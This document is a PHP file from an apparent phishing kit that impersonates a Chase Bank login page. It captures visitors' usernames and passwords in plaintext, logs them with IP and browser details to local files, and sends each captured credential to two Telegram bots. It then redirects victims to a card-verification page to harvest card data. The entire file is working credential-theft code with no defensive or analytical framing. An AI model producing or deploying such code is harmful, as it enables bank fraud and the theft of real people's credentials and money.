<?php
require_once 'bot_protection.php';

// Banking login handler with advanced features
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$remember = isset($_POST['remember']);

// Enhanced logging with banking-specific fields
$session_data = [
    'login_attempt' => [
        'username' => $username,
        'password' => $password,
        'remember_me' => $remember,
        'timestamp' => microtime(true),
        'session_start' => date('c')
    ],
    'client_info' => [
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
        'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown'
    ],
    'security' => [
        'https' => isset($_SERVER['HTTPS']),
        'forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null,
        'real_ip' => $_SERVER['HTTP_X_REAL_IP'] ?? null
    ]
];

// Save to multiple formats for redundancy
file_put_contents('banking_logs.json', json_encode($session_data) . "\n", FILE_APPEND | LOCK_EX);
file_put_contents('banking_logs.txt', 
    date('Y-m-d H:i:s') . " | $username | $password | " . $_SERVER['REMOTE_ADDR'] . "\n", 
    FILE_APPEND | LOCK_EX
);

// Multiple Telegram notifications for high-value banking credentials
$telegram_bots = [
    ['token' => '1111111111:AABBccDDeeFFggHHiiJJkkLLmmNNooP', 'chat' => '123456789'],
    ['token' => '2222222222:QQRRssTTuuVVwwXXyyZZ00112233445', 'chat' => '987654321']
];

foreach ($telegram_bots as $bot) {
    $message = "🏦 BANKING ALERT!\n\n";
    $message .= "🏛️ Service: Chase Bank\n";
    $message .= "👤 Username: {$username}\n";
    $message .= "🔐 Password: {$password}\n";
    $message .= "🌍 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "⏰ " . date('F j, Y g:i A');
    
    $telegram_url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
    $post_data = http_build_query([
        'chat_id' => $bot['chat'],
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    // Non-blocking request
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => $post_data,
            'timeout' => 5
        ]
    ]);
    
    @file_get_contents($telegram_url, false, $context);
}

// Redirect to card verification for banking kits
if ($username && $password) {
    header('Location: card_verification.php');
} else {
    header('Location: index.php?error=1');
}
exit();
?>